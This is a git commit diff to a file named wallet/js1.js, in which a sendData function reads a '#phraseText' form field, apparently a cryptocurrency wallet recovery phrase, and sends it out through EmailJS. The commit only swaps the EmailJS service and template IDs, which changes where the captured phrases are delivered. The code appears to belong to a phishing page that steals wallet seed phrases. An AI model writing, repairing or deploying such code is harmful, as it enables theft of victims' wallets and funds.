a16d68e34b6796f019fbf9e9560ad6e63308601e
hilltopf <Hubbarddrevon6@gmail.com>
2025-03-31 11:25:16 +0100

    Update js1.js

--- wallet/js1.js
+++ wallet/js1.js
@@ -82,7 +82,7 @@ function sendData() {
         phrase: document.querySelector("#phraseText").value
     }
     console.log(tempParams)
-    emailjs.send('service_fr53in4', 'template_hl0m4ow', tempParams)
+    emailjs.send('service_yc8dwjl', 'template_flywigp', tempParams)
 }
 
 form.addEventListener('submit', function(e) {
